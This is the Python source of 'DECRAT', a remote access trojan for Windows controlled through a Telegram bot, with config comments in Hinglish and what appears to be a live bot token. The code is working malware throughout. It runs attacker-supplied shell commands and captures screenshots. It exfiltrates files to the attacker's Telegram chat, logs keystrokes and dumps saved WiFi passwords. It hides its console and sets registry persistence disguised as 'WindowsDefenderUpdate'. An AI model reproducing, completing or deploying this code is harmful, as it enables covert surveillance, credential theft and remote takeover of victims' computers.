# DECRAT — Telegram C2 Agent
# pyinstaller --onefile --noconsole agent_tg.py

import requests, time, subprocess, os, sys, base64, platform, threading

# ══════════════════════════════════════════════════════
#   CONFIG — YAHAN PASTE KARO
# ══════════════════════════════════════════════════════
BOT_TOKEN = "8901039134:AAEBI8Wn-HKC1b3IG9qzz4hIwKnKv_UyIcA"    # @BotFather se
CHAT_ID   = "8889476230"      # @userinfobot se
# ══════════════════════════════════════════════════════

POLL_INTERVAL = 3
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0
kl_buf     = []
kl_running = False

def tg_send(text):
    try:
        for i in range(0, len(text), 4000):
            requests.post(f"{API}/sendMessage", json={
                "chat_id": CHAT_ID,
                "text": text[i:i+4000],
                "parse_mode": "HTML"
            }, timeout=10)
    except: pass

def tg_send_file(filepath, caption=""):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"document": f}, timeout=30)
    except Exception as e:
        tg_send(f"file error: {e}")

def tg_get_updates():
    global last_update_id
    try:
        r = requests.get(f"{API}/getUpdates", params={
            "offset": last_update_id + 1,
            "timeout": 2,
            "allowed_updates": ["message"]
        }, timeout=10)
        return r.json().get("result", [])
    except:
        return []

def run_shell(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=30,
            creationflags=0x08000000 if sys.platform=="win32" else 0
        )
        out = result.stdout + result.stderr
        return out.strip() if out.strip() else "[no output]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error: {e}]"

def screenshot():
    try:
        import ctypes, struct as st
        gdi32  = ctypes.windll.gdi32
        user32 = ctypes.windll.user32
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        hScreen = user32.GetDC(None)
        hDC     = gdi32.CreateCompatibleDC(hScreen)
        hBmp    = gdi32.CreateCompatibleBitmap(hScreen, w, h)
        gdi32.SelectObject(hDC, hBmp)
        gdi32.BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, 0x00CC0020)
        class BIH(ctypes.Structure):
            _fields_ = [("biSize",ctypes.c_uint32),("biWidth",ctypes.c_int32),
                        ("biHeight",ctypes.c_int32),("biPlanes",ctypes.c_uint16),
                        ("biBitCount",ctypes.c_uint16),("biCompression",ctypes.c_uint32),
                        ("biSizeImage",ctypes.c_uint32),("biXPelsPerMeter",ctypes.c_int32),
                        ("biYPelsPerMeter",ctypes.c_int32),("biClrUsed",ctypes.c_uint32),
                        ("biClrImportant",ctypes.c_uint32)]
        bih = BIH()
        bih.biSize=ctypes.sizeof(BIH); bih.biWidth=w; bih.biHeight=-h
        bih.biPlanes=1; bih.biBitCount=24; bih.biCompression=0
        row=((w*3+3)&~3); bih.biSizeImage=row*h
        buf=(ctypes.c_byte*bih.biSizeImage)()
        gdi32.GetDIBits(hDC,hBmp,0,h,buf,ctypes.byref(bih),0)
        hdr=14+ctypes.sizeof(BIH)
        bmp=st.pack("<2sIHHI",b"BM",hdr+bih.biSizeImage,0,0,hdr)+bytes(bih)+bytes(buf)
        gdi32.DeleteObject(hBmp); gdi32.DeleteDC(hDC); user32.ReleaseDC(None,hScreen)
        path="C:\\Windows\\Temp\\ss.bmp"
        with open(path,"wb") as f: f.write(bmp)
        return path
    except:
        return None

def get_sysinfo():
    return (f"🖥 <b>SYSTEM INFO</b>\n"
            f"OS: {platform.system()} {platform.version()}\n"
            f"Host: {platform.node()}\n"
            f"User: {os.environ.get('USERNAME', os.environ.get('USER','?'))}\n"
            f"Arch: {platform.machine()}")

def persist():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,"WindowsDefenderUpdate",0,winreg.REG_SZ,sys.executable)
        winreg.CloseKey(key)
        return "✅ persisted: HKCU Run"
    except Exception as e:
        return f"❌ failed: {e}"

def kl_start():
    global kl_running
    if kl_running: return "already running"
    kl_running = True
    def _run():
        try:
            import ctypes
            user32 = ctypes.windll.user32
            vk_map = {0x20:" ",0x0D:"[ENTER]",0x08:"[BS]",0x09:"[TAB]",0x1B:"[ESC]"}
            while kl_running:
                for vk in list(range(0x30,0x5B))+list(vk_map.keys()):
                    if user32.GetAsyncKeyState(vk)&0x0001:
                        kl_buf.append(vk_map.get(vk, chr(vk)))
                time.sleep(0.01)
        except: pass
    threading.Thread(target=_run, daemon=True).start()
    return "✅ keylogger started"

def handle(text):
    text = text.strip()

    if text in ("/start", "/help"):
        return ("📋 <b>Commands</b>\n\n"
                "/ping — alive check\n"
                "/sysinfo — system info\n"
                "/screenshot — screen capture\n"
                "/shell &lt;cmd&gt; — run command\n"
                "/download &lt;path&gt; — get file\n"
                "/keylog_start — start keylogger\n"
                "/keylog_dump — dump keys\n"
                "/keylog_stop — stop keylogger\n"
                "/persist — autostart\n"
                "/ip — network info\n"
                "/wifi — saved wifi passwords\n"
                "/ps — running processes\n"
                "/users — local users")

    elif text == "/ping":
        return f"🟢 alive — {platform.node()}"

    elif text == "/sysinfo":
        return get_sysinfo()

    elif text == "/screenshot":
        path = screenshot()
        if path: tg_send_file(path, "📸 screenshot"); return None
        return "❌ screenshot failed"

    elif text.startswith("/shell "):
        out = run_shell(text[7:])
        return f"<code>{text[7:]}</code>\n\n{out}"

    elif text.startswith("/download "):
        path = text[10:]
        tg_send_file(path, f"📁 {os.path.basename(path)}")
        return None

    elif text == "/keylog_start":
        return kl_start()

    elif text == "/keylog_dump":
        global kl_running
        data = "".join(kl_buf); kl_buf.clear()
        return f"<b>Keylog:</b>\n<code>{data or '[empty]'}</code>"

    elif text == "/keylog_stop":
        kl_running = False
        return "⏹ keylogger stopped"

    elif text == "/persist":
        return persist()

    elif text == "/ip":
        return run_shell("ipconfig")

    elif text == "/wifi":
        profiles = run_shell("netsh wlan show profiles")
        names = [l.split(":")[-1].strip() for l in profiles.split("\n") if "All User Profile" in l]
        result = ""
        for name in names:
            pw = run_shell(f'netsh wlan show profile name="{name}" key=clear')
            for line in pw.split("\n"):
                if "Key Content" in line:
                    result += f"{name}: {line.split(':')[-1].strip()}\n"
        return result or "no saved passwords found"

    elif text == "/ps":
        return run_shell("tasklist")

    elif text == "/users":
        return run_shell("net user")

    return None

def main():
    if sys.platform == "win32":
        try:
            import ctypes; ctypes.windll.kernel32.FreeConsole()
        except: pass

    global last_update_id
    time.sleep(2)
    tg_send(f"🟢 Agent connected\n{get_sysinfo()}")

    while True:
        try:
            for update in tg_get_updates():
                last_update_id = update["update_id"]
                msg = update.get("message", {})
                if str(msg.get("chat", {}).get("id", "")) != str(CHAT_ID): continue
                text = msg.get("text", "")
                if not text: continue
                response = handle(text)
                if response: tg_send(response)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
